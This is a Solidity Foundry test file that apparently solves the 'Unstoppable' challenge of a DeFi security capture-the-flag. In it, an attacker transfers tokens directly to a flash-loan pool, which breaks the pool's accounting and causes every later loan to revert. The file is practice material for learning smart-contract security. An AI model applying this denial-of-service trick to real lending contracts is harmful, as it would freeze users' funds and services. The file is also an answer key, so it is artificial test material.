// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/DamnValuableToken.sol";
import "../../src/unstoppable/UnstoppableLender.sol";
import "../../src/unstoppable/ReceiverUnstoppable.sol";

contract UnstoppableTest is Test {
    uint256 internal constant TOKENS_IN_POOL = 1000000 ether;
    uint256 internal constant INITIAL_ATTACKER_BALANCE = 100 ether;

    DamnValuableToken internal token;
    UnstoppableLender internal pool;
    ReceiverUnstoppable internal receiverContract;

    address internal deployer = address(1);
    address internal attacker = address(2);
    address internal someUser = address(3);

    function setUp() public {
        startHoax(deployer);
        token = new DamnValuableToken();
        pool = new UnstoppableLender(address(token));

        token.approve(address(pool), TOKENS_IN_POOL);
        pool.depositTokens(TOKENS_IN_POOL);

        token.transfer(attacker, INITIAL_ATTACKER_BALANCE);

        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(attacker), INITIAL_ATTACKER_BALANCE);

        vm.stopPrank();

        startHoax(someUser);
        receiverContract = new ReceiverUnstoppable(address(pool));
        receiverContract.executeFlashLoan(10);
        vm.stopPrank();
    }

    function testExploit() public {
        /** YOUR EXPLOIT GOES HERE */
        hoax(attacker);
        token.transfer(address(pool), INITIAL_ATTACKER_BALANCE);

        /** SUCCESS CONDITION */
        vm.expectRevert();
        hoax(someUser);
        receiverContract.executeFlashLoan(10);
    }
}
